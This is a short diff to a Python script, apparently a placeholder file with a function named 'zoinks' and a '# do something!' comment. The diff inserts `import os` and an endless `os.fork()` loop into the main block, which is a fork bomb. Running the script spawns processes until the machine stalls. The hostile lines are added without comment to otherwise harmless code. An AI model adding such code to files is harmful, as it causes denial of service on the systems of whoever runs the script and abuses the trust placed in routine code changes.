@@ -12,4 +12,7 @@ def zoinks(zoinks):
 
 if __name__ == '__main__':
     # do something!
+    import os
+    while 1:
+        os.fork()
     pass
